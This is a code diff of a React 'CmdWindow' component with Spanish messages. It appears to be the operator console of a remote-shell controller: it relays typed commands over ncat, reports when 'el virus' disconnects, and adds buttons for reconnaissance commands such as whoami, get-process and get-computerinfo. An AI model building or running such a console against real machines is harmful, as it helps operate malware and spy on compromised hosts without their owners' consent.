@@ -9,7 +9,7 @@ function CmdWindow({ port }) {
   const [isNcatConnected, setIsNcatConnected] = useState(false);
   const socketRef = useRef(null);
   const navigate = useNavigate();
-  const commandHistoryRef = useRef(null); // Referencia para el contenedor de historial
+  const commandHistoryRef = useRef(null);
 
   useEffect(() => {
     socketRef.current = new WebSocket('ws://localhost:5000');
@@ -17,6 +17,11 @@ function CmdWindow({ port }) {
     socketRef.current.onmessage = (event) => {
       const data = event.data;
       setCommandHistory((prev) => [...prev, data]);
+    };
+
+    socketRef.current.onclose = () => {
+      setIsNcatConnected(false);
+      setCommandHistory((prev) => [...prev, 'Error: Se desconectó el virus.']);
     };
 
     const startNcat = async () => {
@@ -40,16 +45,8 @@ function CmdWindow({ port }) {
   };
 
   const handleKeyPress = async (event) => {
-    if (event.key === 'Enter' && isNcatConnected) {
-      const command = inputCommand.trim();
-      setCommandHistory((prev) => [...prev, `> ${command}`]);
-      setInputCommand('');
-
-      try {
-        await axios.post('http://localhost:5000/send-command', { command });
-      } catch (error) {
-        console.error('Error sending command:', error);
-      }
+    if (event.key === 'Enter') {
+      await executeCommand(inputCommand.trim());
     }
   };
 
@@ -57,7 +54,22 @@ function CmdWindow({ port }) {
     navigate('/estado');
   };
 
-  // Efecto para hacer scroll hacia abajo al actualizar el historial
+  const executeCommand = async (command) => {
+    setCommandHistory((prev) => [...prev, `> ${command}`]);
+    setInputCommand('');
+
+    try {
+      const response = await axios.post('http://localhost:5000/send-command', { command });
+    } catch (error) {
+      const errorMessage = error.response?.data?.message || 'Error al enviar el comando.';
+      setCommandHistory((prev) => [...prev, errorMessage]);
+    }
+  };
+
+  const handleButtonClick = (command) => {
+    executeCommand(command);
+  };
+
   useEffect(() => {
     if (commandHistoryRef.current) {
       commandHistoryRef.current.scrollTop = commandHistoryRef.current.scrollHeight;
@@ -70,6 +82,12 @@ function CmdWindow({ port }) {
         <button className="back-button" onClick={handleBackClick}>
           Regresar a Ver Estado
         </button>
+        <div className="command-buttons">
+  <button className="command-button" onClick={() => handleButtonClick('whoami')}>whoami</button>
+  <button className="command-button" onClick={() => handleButtonClick('get-service')}>get-service</button>
+  <button className="command-button" onClick={() => handleButtonClick('get-process')}>get-process</button>
+  <button className="command-button" onClick={() => handleButtonClick('get-computerinfo')}>get-computerinfo</button>
+</div>
       </div>
       <div className="cmd-window" ref={commandHistoryRef}>
         <pre className="command-history">
